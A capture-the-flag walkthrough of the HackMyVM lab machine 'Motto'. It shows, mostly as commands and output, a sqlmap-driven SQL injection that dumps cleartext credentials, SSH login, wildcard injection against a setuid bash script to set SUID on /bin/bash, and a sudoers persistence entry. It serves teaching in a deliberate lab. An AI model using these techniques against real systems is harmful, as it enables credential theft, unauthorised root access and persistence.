# Motto

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Motto | Yliken | Beginner | HackMyVM |

**Summary:** Motto is a beginner-level Linux machine featuring a Chinese-language web application vulnerable to SQL injection. The attack path begins with reconnaissance revealing a Golang web application running on port 9090. After registering an account, testers can exploit a SQL injection vulnerability in the nickname modification feature to extract database credentials. These credentials provide SSH access to the system as user `redbean`. Privilege escalation is achieved through a misconfigured SUID binary that executes a bash script with a logical flaw, allowing wildcard injection to bypass string comparison checks and set the SUID bit on `/bin/bash`, ultimately granting root access.

---

## Reconnaissance

### Network Discovery

The initial network scan identified the target machine on the local network:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.112 08:00:27:70:F5:5E VirtualBox
```

The target IP address is **192.168.100.112**, confirmed as a VirtualBox virtual machine.

### Port Scanning

A comprehensive Nmap scan was conducted to enumerate open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/motto]
└─$ nmap -sC -sV -p- -T4 192.168.100.112
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-16 20:49 WIB
Nmap scan report for 192.168.100.112
Host is up (0.0039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: \xE7\x82\xB9\xE5\x87\xBB\xE6\x96\xB9\xE5\x9D\x97\xE5\xB0\x8F\xE6\xB8\xB8\xE6\x88\x8F
9090/tcp open  http    Golang net/http server
| fingerprint-strings:
|   GenericLines, SqueezeCenter_CLI:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Mon, 16 Feb 2026 13:50:15 GMT
|     <!DOCTYPE html>
|     <html lang="zh-CN">
|     <head>
|     <meta charset="UTF-8" />
|     <title>Mottos</title>
|     <link rel="stylesheet" href="/static/css/index.css" />
|     <style>
|     .top-right-auth {
|     position: fixed;
|     top: 20px;
|     right: 30px;
|     font-size: 14px;
|     font-family: Arial, sans-serif;
|     z-index: 1000;
|     .top-right-auth a, .top-right-auth button {
|     color: #2980b9;
|     text-decoration: none;
|     margin-left: 10px;
|     font-weight: 600;
|     border: 1.5px solid #2980b9;
|     padding: 6px 14px;
|     border-radius: 20px;
|     background: none;
|     cursor: pointer;
|_    transition: background-color 0.3s,
|_http-title: Mottos
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.95%I=7%D=2/16%Time=69932099%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x2
SF:0charset=utf-8\r\nDate:\x20Mon,\x2016\x20Feb\x202026\x2013:50:15\x20GMT
SF:\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"zh-CN\">\r\n<head>\r\n\x2
SF:0\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\r\n\x20\x20\x20\x20<title
SF:>Mottos</title>\r\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=
SF:\"/static/css/index\.css\"\x20/>\r\n\x20\x20\x20\x20<style>\r\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\r\n\x20\x20\x20\x20\x20\x20\x20\x20\.top-r
SF:ight-auth\x20{\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20posit
SF:ion:\x20fixed;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\
SF:x2020px;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20right:\x203
SF:0px;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201
SF:4px;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x2
SF:0Arial,\x20sans-serif;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20z-index:\x201000;\r\n\x20\x20\x20\x20\x20\x20\x20\x20}\r\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\.top-right-auth\x20a,\x20\.top-right-auth\x20but
SF:ton\x20{\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#
SF:2980b9;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decorat
SF:ion:\x20none;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin
SF:-left:\x2010px;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font
SF:-weight:\x20600;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20bor
SF:der:\x201\.5px\x20solid\x20#2980b9;\r\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20padding:\x206px\x2014px;\r\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20border-radius:\x2020px;\r\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20background:\x20none;\r\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\r\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20transition:\x20background-color\x200\.3s,")%r
SF:(SqueezeCenter_CLI,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.84 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 8.4p1 Debian 5+deb11u3 - Standard SSH service
- **Port 80 (HTTP)**: Apache httpd 2.4.62 - The title contains Chinese characters suggesting a game
- **Port 9090 (HTTP)**: Golang net/http server - Running a "Mottos" application in Chinese (zh-CN)

### Web Application Enumeration

#### Port 80 - Apache Web Server

Accessing port 80 reveals a simple browser-based game titled "Mazesec" (点击方块小游戏 - "Click on the block mini-game"):

![80](image.png)

This appears to be a rabbit hole - a decoy application with no exploitable vulnerabilities or useful information for the attack path.

#### Port 9090 - Mottos Application

The primary target is the Golang web application on port 9090. The landing page displays a "Mottos" application with user-generated content:

![9090](image-1.png)

The application shows a table with usernames and their mottos in both Chinese and English. The interface includes three navigation links:
- **查看我的Motto** (Check out my Motto)
- **查看我的信息** (Check out my information)
- **写一个Motto** (Write a Motto)

Attempting to access `/myinfo` without authentication redirects to the login page:

![login](image-2.png)

The login page presents two options:
- **登录 Log in** - Login button
- **注册 Register** - Registration button

---

## Initial Access

### User Registration and Authentication

Since no default credentials were found, registration is required to access the application's authenticated features:

![register](image-3.png)

The registration form requires:
- **昵称 (nickname)**: Display name
- **账号 (Account number)**: Username
- **密码 (Passwords)**: Password

After successful registration and login, access is granted to authenticated pages.

### Authenticated Application Features

**Page: /mymotto**

This page displays the current user's motto entries:

![mymotto](image-4.png)

The page shows a table with columns for "Username" and "Motto", displaying mottos created by the authenticated user. The message "暂无数据 No data available" appears when no mottos have been created yet.

**Page: /myinfo**

The user information page allows modification of the nickname field:

![myinfo](image-5.png)

The form displays:
- **昵称 (nickname)**: Current nickname value
- **用户名 (Username)**: Current username
- **修改昵称 (Modify the nickname)**: Button to submit changes

### SQL Injection Discovery

During testing, modifying the nickname to a single quote (`'`) caused the `/mymottos` page to display an empty result:

![gone](image-6.png)

When the nickname is changed to just `'`:

![](image-7.png)

The motto data disappears completely, indicating that the single quote is breaking the SQL query. This behavior is a strong indicator of **SQL injection vulnerability** in the nickname parameter.

### SQL Injection Exploitation

To properly exploit this vulnerability, the HTTP POST request to `/changeNickName` was captured:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/motto]
└─$ vim req_nickname.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/motto]
└─$ cat req_nickname.txt
POST /changeNickName HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: id,en-US;q=0.9,en;q=0.8,id-ID;q=0.7,la;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 13
Content-Type: application/x-www-form-urlencoded
Cookie: yliken_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzEyNTIxNDEsImlhdCI6IjIwMjYtMDItMTZUMDg6NTk6MDEuNjcyNDczNzI1LTA1OjAwIiwibmlja25hbWUiOiInIiwidXNlcm5hbWUiOiIxMjMifQ.025zsG1rjgdnVQ5Ek6yqhBVd7vEYHOyKMjINI109u-o
Host: 192.168.100.112:9090
Origin: http://192.168.100.112:9090
Referer: http://192.168.100.112:9090/myinfo
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

nickname=test
```

The key observation is that the application uses JWT authentication stored in the `yliken_cookie` parameter, and the injection point is the `nickname` POST parameter.

#### SQLMap Exploitation

SQLMap was used with the `--second-url` parameter to verify injection results on the `/mymottos` page:

**Step 1: Database Enumeration**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/motto]
└─$ sqlmap -r req_nickname.txt -p nickname --second-url "http://192.168.100.112:9090/mymottos" --batch --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.11#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
---
Parameter: nickname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: nickname=test' AND (SELECT 9368 FROM (SELECT(SLEEP(5)))ttjj) AND 'LTBE'='LTBE

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: nickname=test' UNION ALL SELECT NULL,CONCAT(0x716b626a71,0x45796771435a4c50654f516247554a714d584b54475579535765534a5957456f7164425765737556,0x7170707671),NULL-- -
---
...
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sql
...
```

**Key Findings:**
- **Injection Type**: Time-based blind and UNION query
- **DBMS**: MySQL >= 5.0.12 (MariaDB fork)
- **Databases**: `information_schema`, `mysql`, `performance_schema`, **`sql`**

The custom database `sql` is the target for further enumeration.

**Step 2: Table Enumeration**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/motto]
└─$ sqlmap -r req_nickname.txt -p nickname --second-url "http://192.168.100.112:9090/mymottos" --batch -D sql --tables
...
Database: sql
[2 tables]
+----------------+
| motto_infos    |
| register_infos |
+----------------+
...
```

**Tables found:**
- `motto_infos` - Stores motto entries
- `register_infos` - Stores user registration information (credentials!)

**Step 3: Column Enumeration**

```bash
...
Database: sql
Table: register_infos
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| nickname | varchar(25) |
| password | varchar(50) |
| user_id  | bigint(20)  |
| username | varchar(25) |
+----------+-------------+
...
```

**Columns identified:**
- `user_id` - User identifier
- `username` - Login username
- `password` - User password (likely cleartext)
- `nickname` - Display name

**Step 4: Credential Extraction**

```bash
...
Database: sql
Table: register_infos
[3 entries]
+-----------------+-----------------+
| username        | password        |
+-----------------+-----------------+
| admin is no use | admin is no use |
| RedBean         | can[REDACTED]   |
| 123             | password        |
+-----------------+-----------------+
...
```

**Credentials Extracted:**

| Username | Password |
|----------|----------|
| admin is no use | admin is no use |
| **RedBean** | **can[REDACTED]** |
| 123 | password |

The credentials `RedBean:can[REDACTED]` appear to be legitimate system credentials, while "admin is no use" is likely a hint that admin credentials won't work for SSH access.

### SSH Access

Attempting SSH login with the extracted credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/motto]
└─$ ssh redbean@192.168.100.112
...
redbean@motto:~$ id
uid=1000(redbean) gid=1000(redbean) groups=1000(redbean)
redbean@motto:~$ ls -la
total 32
drwxr-xr-x 3 redbean redbean 4096 Jul 31  2025 .
drwxr-xr-x 3 root    root    4096 Jul 31  2025 ..
drwxr-xr-x 2 root    root    4096 Jul 31  2025 .backup
lrwxrwxrwx 1 root    root       9 Jul 31  2025 .bash_history -> /dev/null
-rw-r--r-- 1 redbean redbean  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 redbean redbean 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 redbean redbean  807 Apr 18  2019 .profile
-rw-r--r-- 1 root    root      33 Jul 31  2025 user.txt
-rw------- 1 redbean redbean  928 Jul 31  2025 .viminfo
```

**Success!** SSH access obtained as user `redbean`. Notable observations:
- `.bash_history` is symlinked to `/dev/null` (history disabled)
- `.backup` directory exists and is owned by root
- `user.txt` flag is present and owned by root

---

## Privilege Escalation

### Enumeration

The first step in privilege escalation is identifying SUID binaries that could be exploited:

```bash
redbean@motto:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 47184 Apr  6  2024 /usr/bin/mount
-rwsr-xr-x 1 root root 63568 Apr  6  2024 /usr/bin/su
-rwsr-xr-x 1 root root 34888 Apr  6  2024 /usr/bin/umount
-rwsr-xr-x 1 root root 23448 Jan 13  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 182600 Jan 14  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-- 1 root messagebus 51336 Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 481608 Dec 21  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-sr-x 1 root root 16864 Jul 31  2025 /opt/run_newsh
```

**Critical Finding**: `/opt/run_newsh` is a custom SUID binary owned by root with both setuid and setgid bits set. This is highly unusual and warrants immediate investigation.

```bash
redbean@motto:~$ ls -la /opt/run_newsh
-rwsr-sr-x 1 root root 16864 Jul 31  2025 /opt/run_newsh
redbean@motto:~$ ls -la /opt
total 32
drwxr-xr-x  2 root root  4096 Jul 31  2025 .
drwxr-xr-x 19 root root  4096 Jul 31  2025 ..
-r-xr-----  1 root root  1709 Jul 31  2025 new.sh
-rwsr-sr-x  1 root root 16864 Jul 31  2025 run_newsh
```

**Observations:**
- `/opt/new.sh` - A script file with restricted permissions (readable/executable by root group only)
- `/opt/run_newsh` - The SUID wrapper binary

```bash
redbean@motto:~$ file /opt/*
/opt/new.sh:    regular file, no read permission
/opt/run_newsh: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5871380f0b8a03dea808046e697b19b030d1a5d, for GNU/Linux 3.2.0, not stripped
```

### Binary Analysis

Using `strings` to analyze the binary reveals its functionality:

```bash
redbean@motto:~$ strings /opt/run_newsh
/lib64/ld-linux-x86-64.so.2
setuid
execv
perror
stderr
fprintf
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Usage: %s <arg>
/opt/new.sh
execv failed
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_newsh.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__libc_start_main@GLIBC_2.2.5
__data_start
fprintf@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@GLIBC_2.2.5
perror@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
execv@GLIBC_2.2.5
stderr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

**Key strings identified:**
- `Usage: %s <arg>` - Requires one argument
- `/opt/new.sh` - The script being executed
- `setuid`, `setgid`, `execv` - Functions used to elevate privileges and execute

### Testing the Binary

```bash
redbean@motto:~$ /opt/run_newsh
Usage: /opt/run_newsh <arg>
redbean@motto:~$ /opt/run_newsh /opt/new.sh

▓▒░ Loading system diagnostics ░▒▓

[INFO] Initializing environment checks:
 ● Module A status: OK (ver 2.9.168)
 ● Module B status: OK (ver 1.5.247)
 ● Module C status: OK (ver 3.5.144)
Random seed value: 3282
[INFO] Evaluating input parameters...
[INFO] Running diagnostic sequence:
 → Executing test 1 of 3
 → Executing test 2 of 3
 → Executing test 3 of 3

Waiting period: 4 seconds
>> Waiting T-4 seconds...
>> Countdown: 3
>> Waiting T-2 seconds...
>> Countdown: 1
>> Waiting T-0 seconds...
System stable.
Thank you for using the system monitor.
[STATS] Summary Report:
    Processes checked: 57
/opt/new.sh: line 60: bc: command not found
    CPU load average:
    Uptime (hours): 61
```

The binary successfully executes the script with root privileges, but nothing exploitable happens yet. The script appears to be a fake system diagnostic tool.

### Source Code Analysis

Fortunately, a backup directory exists in the home folder with readable source code:

```bash
redbean@motto:~$ ls -la
total 32
drwxr-xr-x 3 redbean redbean 4096 Jul 31  2025 .
drwxr-xr-x 3 root    root    4096 Jul 31  2025 ..
drwxr-xr-x 2 root    root    4096 Jul 31  2025 .backup
lrwxrwxrwx 1 root    root       9 Jul 31  2025 .bash_history -> /dev/null
-rw-r--r-- 1 redbean redbean  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 redbean redbean 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 redbean redbean  807 Apr 18  2019 .profile
-rw-r--r-- 1 root    root      33 Jul 31  2025 user.txt
-rw------- 1 redbean redbean  928 Jul 31  2025 .viminfo
redbean@motto:~$ cd .backup/
redbean@motto:~/.backup$ ls -a
.  ..  new.sh  run_newsh.c
redbean@motto:~/.backup$ ls -la
total 16
drwxr-xr-x 2 root    root    4096 Jul 31  2025 .
drwxr-xr-x 3 redbean redbean 4096 Jul 31  2025 ..
-r--r--r-- 1 root    root    1709 Jul 31  2025 new.sh
-rw-r--r-- 1 root    root     509 Jul 31  2025 run_newsh.c
```

**C Source Code (`run_newsh.c`):**

```bash
redbean@motto:~/.backup$ cat run_newsh.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <arg>\n", argv[0]);
        return 1;
    }

    // 切换为 root 权限（如果以 setuid 运行）
    setuid(0);
    setgid(0);

    // 构造参数，调用 ./new.sh 参数
    char *script = "/opt/new.sh";
    char *args[] = { script, argv[1], NULL };

    execv(script, args);  // 用 execv 调用脚本

    perror("execv failed");
    return 1;
}
```

**Analysis:**
The C wrapper sets UID/GID to 0 (root) and executes `/opt/new.sh` with the user-supplied argument. This means we can pass arbitrary arguments to the bash script as root.

**Bash Script (`new.sh`):**

```bash
redbean@motto:~/.backup$ cat new.sh
#!/bin/bash
PATH=/usr/bin

echo -e "\033[1;35m"
echo '▓▒░ Loading system diagnostics ░▒▓'
echo -e "\033[0m"

echo -e "\033[1;34m[INFO]\033[0m Initializing environment checks:"
for step in A B C; do
    echo -e "\033[1;33m ● Module ${step} status: OK (ver $(($RANDOM%5+1)).$(($RANDOM%20)).$(($RANDOM%500)))\033[0m"
    sleep 0.12
done

echo "Random seed value: $RANDOM"
echo -e "\033[1;34m[INFO]\033[0m Evaluating input parameters..."
sleep 0.15

[ -n "$1" ] || exit 1
[ "$1" = "flag" ] && exit 2
[ $1 = "flag" ] && chmod +s /bin/bash

echo -e "\033[1;34m[INFO]\033[0m Running diagnostic sequence:"
for step in {1..3}; do
    echo -e "\033[1;35m → Executing test ${step} of 3\033[0m"
    sleep 0.2
done

WAIT_TIME=$((RANDOM%5+2))
echo -e "\033[1;36m\nWaiting period: \033[3${WAIT_TIME}m${WAIT_TIME} seconds\033[0m"

for ((i=WAIT_TIME; i>=0; i--)); do
    case $((i%4)) in
        0) COL="34" ;; # 蓝
        1) COL="32" ;; # 绿
        2) COL="31" ;; # 红
        3) COL="36" ;; # 青
    esac

    case $((i%2)) in
        0) echo -e "\033[1;${COL}m>> Waiting T-${i} seconds...\033[0m" ;;
        1) echo -e "\033[1;${COL}m>> Countdown: ${i}\033[0m" ;;
    esac

    [ $i -gt 0 ] && sleep 1
done

RESULTS=(
    "Diagnostics complete."
    "All systems nominal."
    "No errors detected."
    "System stable."
)

FINAL_MSG=${RESULTS[$RANDOM % ${#RESULTS[@]}]}
echo -e "\033[1;32m${FINAL_MSG}\033[0m"
echo -e "\033[1;34mThank you for using the system monitor.\033[0m"

echo -e "\033[1;30m[STATS] Summary Report:\033[0m"
echo -e "    Processes checked: $((RANDOM%60+20))"
echo -e "    CPU load average: $(echo "scale=2; $RANDOM%10+0.5" | bc)"
echo -e "    Uptime (hours): $((RANDOM%100+1))"
```

**Critical Vulnerability Identified:**

Lines 16-18 contain the privilege escalation vulnerability:

```bash
[ -n "$1" ] || exit 1
[ "$1" = "flag" ] && exit 2
[ $1 = "flag" ] && chmod +s /bin/bash
```

**Vulnerability Breakdown:**

1. **Line 16**: Checks if argument `$1` is non-empty
2. **Line 17**: `[ "$1" = "flag" ]` - **Quoted comparison** - Exits if `$1` exactly equals string "flag"
3. **Line 18**: `[ $1 = "flag" ]` - **Unquoted comparison** - Sets SUID on `/bin/bash` if `$1` expands to match "flag"

The key difference is **quoting**:
- Line 17 with quotes: Direct string comparison, no globbing
- Line 18 without quotes: Bash performs **pathname expansion (globbing)** before comparison

### Exploitation: Wildcard Injection

The unquoted variable `$1` in line 18 allows **wildcard injection**. If we create a file named `flag` and pass the argument `f*`, bash will:

1. Expand `f*` to match the filename `flag`
2. Compare the expanded value against the string "flag"
3. Execute `chmod +s /bin/bash` when they match

However, the quoted check on line 17 will prevent this because `"f*"` does not equal `"flag"` as a literal string.

**Exploitation Steps:**

```bash
redbean@motto:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Currently `/bin/bash` has no SUID bit set.

**Step 1: Navigate to /tmp and create a file named "flag":**

```bash
redbean@motto:~$ cd /tmp
redbean@motto:/tmp$ touch flag
```

**Step 2: Execute the SUID binary with wildcard argument:**

```bash
redbean@motto:/tmp$ /opt/run_newsh 'f*'

▓▒░ Loading system diagnostics ░▒▓

[INFO] Initializing environment checks:
 ● Module A status: OK (ver 4.4.342)
 ● Module B status: OK (ver 2.2.195)
 ● Module C status: OK (ver 2.13.284)
Random seed value: 14659
[INFO] Evaluating input parameters...
[INFO] Running diagnostic sequence:
 → Executing test 1 of 3
 → Executing test 2 of 3
 → Executing test 3 of 3

Waiting period: 5 seconds
>> Countdown: 5
>> Waiting T-4 seconds...
>> Countdown: 3
>> Waiting T-2 seconds...
>> Countdown: 1
>> Waiting T-0 seconds...
Diagnostics complete.
Thank you for using the system monitor.
[STATS] Summary Report:
    Processes checked: 63
/opt/new.sh: line 60: bc: command not found
    CPU load average:
    Uptime (hours): 58
```

**Step 3: Verify SUID bit is set:**

```bash
redbean@motto:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

**Success!** The SUID and SGID bits are now set on `/bin/bash` (`rwsr-sr-x`).

**What happened:**
1. Bash changed directory to `/tmp` (where the script was invoked)
2. The argument `'f*'` was passed to the script
3. Line 17: `[ "f*" = "flag" ]` - Failed (literal comparison, no match)
4. Line 18: `[ f* = "flag" ]` - Bash expanded `f*` to `flag` (matching the file), then compared `flag == flag` - **Success!**
5. `chmod +s /bin/bash` executed with root privileges

### Root Shell

Execute bash with the `-p` flag to preserve elevated privileges:

```bash
redbean@motto:/tmp$ /bin/bash -p
bash-5.0# id
uid=1000(redbean) gid=1000(redbean) euid=0(root) egid=0(root) groups=0(root),1000(redbean)
```

**Root access achieved!** Note the effective UID (`euid=0`) and effective GID (`egid=0`) are root.

### Post-Exploitation

With root access, various system modifications can be made:

```bash
bash-5.0# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       PyCrt.PyCrt     PyCrt

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
bash-5.0# echo "127.0.0.1 motto" >> /etc/hosts
bash-5.0# echo 'redbean ALL=(ALL:ALL) ALL' > /etc/sudoers.d/redbean
bash-5.0# chmod 0440 /etc/sudoers.d/redbean
bash-5.0# /usr/sbin/visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/redbean: parsed OK
bash-5.0# exit
exit
```

For persistence and cleaner root access, sudo privileges were granted to the `redbean` user.

**Using sudo for root shell:**

```bash
redbean@motto:/tmp$ sudo -i
root@motto:~# id
uid=0(root) gid=0(root) groups=0(root)
root@motto:~# hostname
motto
root@motto:~# whoami
root
```

### Flag Retrieval

```bash
root@motto:~# cat /home/redbean/user.txt /root/root.txt
flag{796[REDACTED]}
flag{796[REDACTED]}
```

Both user and root flags have been successfully captured!

---

## Attack Chain Summary

1. **Reconnaissance**: Conducted network scan identifying target IP 192.168.100.112. Nmap revealed three open ports: SSH (22), HTTP Apache (80), and Golang HTTP server (9090).

2. **Web Application Discovery**: Port 80 hosted a decoy game (rabbit hole). Port 9090 ran a Chinese-language "Mottos" web application with authentication required for sensitive endpoints.

3. **Account Registration**: Registered a new user account to access authenticated application features including `/myinfo`, `/mymotto`, and `/mymottos` pages.

4. **Vulnerability Discovery**: Identified SQL injection vulnerability in the nickname modification feature at `/changeNickName` endpoint. Input validation was insufficient, allowing malicious SQL payloads to alter query logic.

5. **SQL Injection Exploitation**: Utilized SQLMap with `--second-url` parameter to exploit time-based blind and UNION-based SQL injection. Enumerated database `sql`, extracted tables `register_infos` and `motto_infos`, and dumped credentials.

6. **Credential Extraction**: Retrieved cleartext credentials from database: `RedBean:can[REDACTED]`. Credentials were valid for SSH authentication.

7. **Initial Access**: Successfully authenticated via SSH as user `redbean`, gaining shell access to the target system.

8. **SUID Binary Discovery**: Enumerated SUID binaries and identified custom binary `/opt/run_newsh` with setuid/setgid bits owned by root.

9. **Source Code Analysis**: Analyzed backup source code in `~/.backup/` revealing C wrapper that executes `/opt/new.sh` with elevated privileges. Bash script contained logic flaw in conditional checks.

10. **Wildcard Injection Exploitation**: Exploited unquoted variable comparison in bash script by creating file named `flag` and passing wildcard argument `f*`. Bash pathname expansion caused conditional to match, triggering `chmod +s /bin/bash`.

11. **Privilege Escalation**: Executed `/bin/bash -p` to spawn root shell using SUID bit, achieving full system compromise with effective UID 0.

12. **Persistence & Flag Capture**: Added sudo privileges for `redbean` user via `/etc/sudoers.d/redbean`. Retrieved both user and root flags successfully.

